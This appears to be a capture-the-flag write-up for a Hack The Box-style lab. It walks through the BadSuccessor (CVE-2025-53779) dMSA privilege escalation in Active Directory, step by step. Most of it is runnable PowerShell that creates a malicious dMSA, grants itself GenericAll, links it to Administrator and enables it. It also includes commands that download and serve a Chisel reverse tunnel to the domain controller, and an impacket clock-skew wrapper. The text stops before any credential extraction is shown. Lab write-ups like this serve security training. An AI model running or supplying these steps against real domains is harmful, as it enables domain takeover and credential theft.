Privilege Escalation — BadSuccessor

CVE-2025-53779
BadSuccessor — Delegated Managed Service Account Abuse
Windows Server 2025 introduced Delegated Managed Service Accounts (dMSA), which can supersede a predecessor account and inherit its credentials. Any principal with CreateChild on an OU can create a dMSA, link it to any privileged account as a predecessor (e.g. Administrator), and extract that account's NT hash — without Domain Admin membership.

adam.scott is in the IT group, which holds CreateChild on OU=Staff. This is the exploit entry point.

Step 1 — Enumerate ACLs on OU=Staff
powershell
Import-Module ActiveDirectory
$ouDN = "OU=Staff,DC=eighteen,DC=htb"
$acl  = Get-ACL "AD:\$ouDN"
$acl.Access | Where-Object {
    $_.IdentityReference -eq "EIGHTEEN\IT" -and
    $_.ActiveDirectoryRights -match "CreateChild"
}
Step 2 — Create Malicious dMSA Object
powershell
$dmsaName = "pwndMSA"
$ouDN     = "OU=Staff,DC=eighteen,DC=htb"

New-ADObject -Name $dmsaName -Type "msDS-DelegatedManagedServiceAccount" -Path $ouDN `
    -OtherAttributes @{
        "sAMAccountName"               = "$dmsaName$"
        "msDS-DelegatedMSAState"       = 0
        "msDS-ManagedPasswordInterval" = 30
    }
Step 3 — Grant GenericAll via Implicit WriteDACL

As creator/owner, adam.scott has implicit WriteDACL — used to add a GenericAll ACE:

powershell
$dmsaDN = "CN=$dmsaName,$ouDN"
$acl    = Get-ACL "AD:\$dmsaDN"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]"EIGHTEENdam.scott",
    [System.DirectoryServices.ActiveDirectoryRights]"GenericAll",
    [System.Security.AccessControl.AccessControlType]"Allow"
)
$acl.AddAccessRule($ace)
Set-ACL "AD:\$dmsaDN" $acl
Step 4 — Link dMSA Predecessor to Administrator
powershell
Set-ADObject -Identity $dmsaDN -Replace @{
    "msDS-ManagedAccountPrecededByLink" =
        "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
}
Step 5 — Set GroupMSAMembership and Activate
powershell
$adamSID = (Get-ADUser adam.scott).SID
$sddl = "O:BAD:(A;;RPWPCRLCLOCCDCRCWDWOSDDTSW;;;$adamSID)" +
        "(A;;RPWPCRLCLOCCDCRCWDWOSDDTSW;;;BA)"
$sd      = New-Object System.Security.AccessControl.RawSecurityDescriptor($sddl)
$sdBytes = New-Object byte[] $sd.BinaryLength
$sd.GetBinaryForm($sdBytes, 0)

Set-ADObject -Identity $dmsaDN -Replace @{
    "msDS-GroupMSAMembership" = $sdBytes
    "msDS-DelegatedMSAState"  = 2
}
Step 6 — Enable the dMSA Account

New dMSAs are created with ACCOUNTDISABLE set. Change userAccountControl from 4130 to 4128:

powershell
Set-ADObject -Identity $dmsaDN -Replace @{ "userAccountControl" = 4128 }
Step 7 — Chisel Reverse Tunnel (Kerberos + LDAP)

Ports 88 and 389 are firewalled. A Chisel reverse tunnel bridges from the DC to the attacker:

curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz   | gunzip > /tmp/chisel_linux && chmod +x /tmp/chisel_linux
curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz   | gunzip > /tmp/chisel.exe
python3 -m http.server 8080 &

Step 8 — Clock Skew Fix (KRB_AP_ERR_SKEW)

Kali was ~7 hours behind the DC. A Python wrapper patches time.time() and datetime.datetime to compensate without needing root:

python — /tmp/getST_timefixed.py
import time, datetime

_OFFSET = 25200  # 7 hours in seconds
_orig = time.time
time.time = lambda: _orig() + _OFFSET

class PatchedDatetime(datetime.datetime):
    @classmethod
    def now(cls, tz=None):
        base = datetime.datetime.now.__func__(cls) if tz is None                else datetime.datetime.now.__func__(cls, tz)
        return base + datetime.timedelta(seconds=_OFFSET)
    @classmethod
    def utcnow(cls):
        return datetime.datetime.utcnow.__func__(cls) +                datetime.timedelta(seconds=_OFFSET)

datetime.datetime = PatchedDatetime

import runpy
runpy.run_path('/usr/share/doc/python3-impacket/examples/getST.py',
               run_name='__main__')
ℹ  If clock sync is available: sudo ntpdate 10.129.5.161 — then use impacket-getST directly.
